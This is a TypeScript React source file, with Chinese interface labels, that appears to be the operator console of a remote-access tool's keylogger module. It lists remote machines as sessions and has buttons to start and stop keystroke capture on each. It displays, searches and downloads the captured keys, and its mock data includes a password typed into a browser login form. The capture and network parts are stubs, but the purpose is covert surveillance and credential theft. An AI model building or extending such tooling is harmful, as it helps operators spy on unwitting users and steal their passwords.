import React, { useState, useEffect } from 'react';
import { Card, Button, Table, message, Space, Select, Input, Tag, Typography } from 'antd';

const { Option } = Select;
import { ReloadOutlined, DownloadOutlined, PlayCircleOutlined, PauseCircleOutlined, ClearOutlined } from '@ant-design/icons';
const { Text } = Typography;

interface Session {
  id: string;
  name: string;
  ip: string;
  platform: string;
  status: string;
  lastSeen: string;
}

interface Keylog {
  id: string;
  sessionId: string;
  timestamp: string;
  keys: string;
  window: string;
  application: string;
}

const Keylogger: React.FC = () => {
  const [sessions, setSessions] = useState<Session[]>([]);
  const [keylogs, setKeylogs] = useState<Keylog[]>([]);
  const [loading, setLoading] = useState(false);
  const [keyloggingStatus, setKeyloggingStatus] = useState<{[key: string]: string}>({});
  const [filterSession, setFilterSession] = useState<string>('all');
  const [searchText, setSearchText] = useState<string>('');

  // 获取会话列表
  const fetchSessions = async () => {
    setLoading(true);
    try {
      // 这里应该调用WebSocket服务获取会话列表
      // 暂时使用模拟数据
      const mockSessions: Session[] = [
        {
          id: '1',
          name: 'WIN10-PC',
          ip: '192.168.1.100',
          platform: 'Windows',
          status: 'active',
          lastSeen: '2026-03-31 10:00:00'
        },
        {
          id: '2',
          name: 'Ubuntu-Server',
          ip: '192.168.1.101',
          platform: 'Linux',
          status: 'active',
          lastSeen: '2026-03-31 10:05:00'
        },
        {
          id: '3',
          name: 'MacBook-Pro',
          ip: '192.168.1.102',
          platform: 'macOS',
          status: 'inactive',
          lastSeen: '2026-03-31 09:50:00'
        }
      ];
      setSessions(mockSessions);
      message.success('获取会话列表成功');
    } catch (error) {
      console.error('Error fetching sessions:', error);
      message.error('获取会话列表失败');
    } finally {
      setLoading(false);
    }
  };

  // 获取键盘记录
  const fetchKeylogs = async () => {
    setLoading(true);
    try {
      // 这里应该调用WebSocket服务获取键盘记录
      // 暂时使用模拟数据
      const mockKeylogs: Keylog[] = [
        {
          id: '1',
          sessionId: '1',
          timestamp: '2026-03-31 10:00:00',
          keys: 'Hello World!',
          window: 'Notepad',
          application: 'notepad.exe'
        },
        {
          id: '2',
          sessionId: '1',
          timestamp: '2026-03-31 10:05:00',
          keys: 'Password123',
          window: 'Login Form',
          application: 'chrome.exe'
        },
        {
          id: '3',
          sessionId: '2',
          timestamp: '2026-03-31 10:10:00',
          keys: 'sudo apt update',
          window: 'Terminal',
          application: 'bash'
        }
      ];
      setKeylogs(mockKeylogs);
      message.success('获取键盘记录成功');
    } catch (error) {
      console.error('Error fetching keylogs:', error);
      message.error('获取键盘记录失败');
    } finally {
      setLoading(false);
    }
  };

  // 开始键盘记录
  const handleStartKeylogging = async (sessionId: string) => {
    try {
      // 这里应该调用WebSocket服务开始键盘记录
      message.success('正在开始键盘记录...');
      // 模拟开始成功
      setTimeout(() => {
        setKeyloggingStatus({...keyloggingStatus, [sessionId]: 'active'});
        message.success('键盘记录已开始');
      }, 1000);
    } catch (error) {
      console.error('Error starting keylogging:', error);
      message.error('开始键盘记录失败');
    }
  };

  // 停止键盘记录
  const handleStopKeylogging = async (sessionId: string) => {
    try {
      // 这里应该调用WebSocket服务停止键盘记录
      message.success('正在停止键盘记录...');
      // 模拟停止成功
      setTimeout(() => {
        setKeyloggingStatus({...keyloggingStatus, [sessionId]: 'inactive'});
        message.success('键盘记录已停止');
      }, 1000);
    } catch (error) {
      console.error('Error stopping keylogging:', error);
      message.error('停止键盘记录失败');
    }
  };

  // 下载键盘记录
  const handleDownloadKeylogs = () => {
    const logContent = keylogs.map(log => {
      return `${log.timestamp} [${log.sessionId}] [${log.application}] [${log.window}] ${log.keys}`;
    }).join('\n');

    const blob = new Blob([logContent], { type: 'text/plain' });
    const url = URL.createObjectURL(blob);
    const a = document.createElement('a');
    a.href = url;
    a.download = `keylogs-${new Date().toISOString().split('T')[0]}.txt`;
    document.body.appendChild(a);
    a.click();
    document.body.removeChild(a);
    URL.revokeObjectURL(url);
    message.success('键盘记录下载成功');
  };

  // 清除键盘记录
  const handleClearKeylogs = async () => {
    try {
      // 这里应该调用WebSocket服务清除键盘记录
      setKeylogs([]);
      message.success('键盘记录清除成功');
    } catch (error) {
      console.error('Error clearing keylogs:', error);
      message.error('清除键盘记录失败');
    }
  };

  // 过滤键盘记录
  const filteredKeylogs = keylogs.filter(log => {
    const sessionMatch = filterSession === 'all' || log.sessionId === filterSession;
    const searchMatch = searchText === '' || 
      log.keys.toLowerCase().includes(searchText.toLowerCase()) ||
      log.window.toLowerCase().includes(searchText.toLowerCase()) ||
      log.application.toLowerCase().includes(searchText.toLowerCase());
    return sessionMatch && searchMatch;
  });

  useEffect(() => {
    fetchSessions();
    fetchKeylogs();
  }, []);

  const sessionColumns = [
    {
      title: '会话名称',
      dataIndex: 'name',
      key: 'name',
    },
    {
      title: 'IP地址',
      dataIndex: 'ip',
      key: 'ip',
    },
    {
      title: '平台',
      dataIndex: 'platform',
      key: 'platform',
    },
    {
      title: '状态',
      dataIndex: 'status',
      key: 'status',
      render: (status: string) => (
        <span style={{
          color: status === 'active' ? '#52c41a' : '#ff4d4f'
        }}>
          {status === 'active' ? '活跃' : '非活跃'}
        </span>
      ),
    },
    {
      title: '键盘记录状态',
      key: 'keyloggingStatus',
      render: (_: any, record: Session) => {
        const status = keyloggingStatus[record.id] || 'inactive';
        return (
          <Tag color={status === 'active' ? 'green' : 'red'}>
            {status === 'active' ? '正在记录' : '未记录'}
          </Tag>
        );
      },
    },
    {
      title: '操作',
      key: 'action',
      render: (_: any, record: Session) => {
        const status = keyloggingStatus[record.id] || 'inactive';
        return (
          <Space size="middle">
            {status === 'inactive' ? (
              <Button 
                type="primary" 
                icon={<PlayCircleOutlined />} 
                size="small" 
                onClick={() => handleStartKeylogging(record.id)}
                disabled={record.status !== 'active'}
              >
                开始记录
              </Button>
            ) : (
              <Button 
                danger 
                icon={<PauseCircleOutlined />} 
                size="small" 
                onClick={() => handleStopKeylogging(record.id)}
              >
                停止记录
              </Button>
            )}
          </Space>
        );
      },
    },
  ];

  const keylogColumns = [
    {
      title: '会话ID',
      dataIndex: 'sessionId',
      key: 'sessionId',
    },
    {
      title: '时间戳',
      dataIndex: 'timestamp',
      key: 'timestamp',
      sorter: (a: Keylog, b: Keylog) => a.timestamp.localeCompare(b.timestamp),
      defaultSortOrder: 'descend' as const,
    },
    {
      title: '应用程序',
      dataIndex: 'application',
      key: 'application',
    },
    {
      title: '窗口',
      dataIndex: 'window',
      key: 'window',
    },
    {
      title: '按键',
      dataIndex: 'keys',
      key: 'keys',
      render: (keys: string) => (
        <Text style={{ wordBreak: 'break-all' }}>{keys}</Text>
      ),
    },
  ];

  return (
    <div>
      <Card 
        title="键盘记录" 
        extra={
          <Space>
            <Button 
              icon={<ReloadOutlined />} 
              onClick={fetchSessions}
              loading={loading}
            >
              刷新会话
            </Button>
          </Space>
        }
      >
        <h3>可用会话</h3>
        <Table 
          columns={sessionColumns} 
          dataSource={sessions} 
          rowKey="id" 
          pagination={{ pageSize: 10 }}
          style={{ marginBottom: 24 }}
        />

        <h3>键盘记录</h3>
        <Space style={{ marginBottom: 16 }}>
          <Select 
            defaultValue="all" 
            onChange={setFilterSession}
            style={{ width: 150 }}
          >
            <Option value="all">所有会话</Option>
            {sessions.map(session => (
              <Option key={session.id} value={session.id}>{session.name}</Option>
            ))}
          </Select>
          <Input 
            placeholder="搜索按键、窗口或应用程序" 
            style={{ width: 300 }}
            onChange={(e) => setSearchText(e.target.value)}
          />
          <Button 
            icon={<ReloadOutlined />} 
            onClick={fetchKeylogs}
          >
            刷新记录
          </Button>
          <Button 
            icon={<DownloadOutlined />} 
            onClick={handleDownloadKeylogs}
            disabled={filteredKeylogs.length === 0}
          >
            下载记录
          </Button>
          <Button 
            danger 
            icon={<ClearOutlined />} 
            onClick={handleClearKeylogs}
            disabled={keylogs.length === 0}
          >
            清除记录
          </Button>
        </Space>
        <Table 
          columns={keylogColumns} 
          dataSource={filteredKeylogs} 
          rowKey="id" 
          pagination={{ pageSize: 20 }}
        />
      </Card>
    </div>
  );
};

export default Keylogger;